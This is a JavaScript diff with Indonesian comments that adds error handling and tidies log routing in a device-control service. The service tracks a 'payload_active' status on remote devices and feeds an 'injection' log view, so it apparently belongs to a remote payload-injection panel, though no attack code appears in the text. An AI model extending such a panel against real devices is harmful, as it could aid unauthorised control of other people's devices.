@@ -152,41 +152,42 @@ const DeviceService = {
         await StreamManager.stop("device-switch", false);
         showLoader(true);
 
-        // Ambil data device terbaru dari server (bypass cache lokal)
-        const { data: deviceData, error: deviceError } = await supabaseClient.from("devices").select("*").eq("id", deviceId).maybeSingle();
+        try {
+            // Ambil data device terbaru dari server (bypass cache lokal)
+            const { data: deviceData, error: deviceError } = await supabaseClient.from("devices").select("*").eq("id", deviceId).maybeSingle();
 
-        // Ambil Config dari Database
-        const { data: settings } = await supabaseClient.from("app_settings").select("value").eq("key", "payload_urls").maybeSingle();
+            if (deviceData) {
+                const status = (typeof deviceData.status === "string") ? JSON.parse(deviceData.status || "{}") : (deviceData.status || {});
 
-        showLoader(false);
+                // Re-sync local state
+                setState({
+                    data: {
+                        selectedDeviceId: deviceId,
+                        selectedDevice: deviceData
+                    }
+                });
 
-        if (deviceData) {
-            const status = (typeof deviceData.status === "string") ? JSON.parse(deviceData.status || "{}") : (deviceData.status || {});
+                this.bindDevice(deviceId);
 
-            // Re-sync local state
-            setState({
-                data: {
-                    selectedDeviceId: deviceId,
-                    selectedDevice: deviceData
+                // LOGIKA AUTO-INJECT PINTAR:
+                const wasJustInjected = state.data.controlStatesByDevice[deviceId]?.payload_active;
+
+                if ((status.payload_active || wasJustInjected) && isOnline(deviceData)) {
+                    addLogEntry(`Device active: ${deviceData.name || deviceId}`);
+                } else {
+                    addLogEntry("Device selected. Payload status will sync shortly.");
                 }
-            });
 
-            this.bindDevice(deviceId);
-
-            // LOGIKA AUTO-INJECT PINTAR:
-            // Jika payload_active true DAN device online, atau jika device baru saja inject (local session)
-            const wasJustInjected = state.data.controlStatesByDevice[deviceId]?.payload_active;
-
-            if ((status.payload_active || wasJustInjected) && isOnline(deviceData)) {
-                addLogEntry(`Device active: ${deviceData.name || deviceId}`);
+                await showView("remote");
             } else {
-                addLogEntry("Device selected. Payload status will sync shortly.");
+                addToast("Device not found on server", "error");
+                this.clearSelection();
             }
-
-            await showView("remote");
-        } else {
-            addToast("Device not found on server", "error");
-            this.clearSelection();
+        } catch (err) {
+            console.error("Select error", err);
+            addToast("Failed to connect to device", "error");
+        } finally {
+            showLoader(false);
         }
     },
 
@@ -230,9 +231,9 @@ const DeviceService = {
             }]), { silent: true }
         );
 
-        if (!result) {
+        if (!result || result.success === false) {
             if (!silent) addToast("Command failed to sync", "error");
-            return { success: false, error: "sync_failed" };
+            return { success: false, error: result?.error || "sync_failed" };
         }
 
         if (showSuccess) {
@@ -255,9 +256,9 @@ const DeviceService = {
         const type = row?.data_type;
         const content = row?.content;
 
-        // Route all relevant logs to injection UI if active
+        // Route logs and errors to injection UI if active
         if (state.ui.modal?.type === "injection") {
-            if (type === "injection_log" || type === "log" || type === "error") {
+            if (["injection_log", "log", "error"].includes(type)) {
                 UI.updateInjectionLog(content);
                 return;
             }
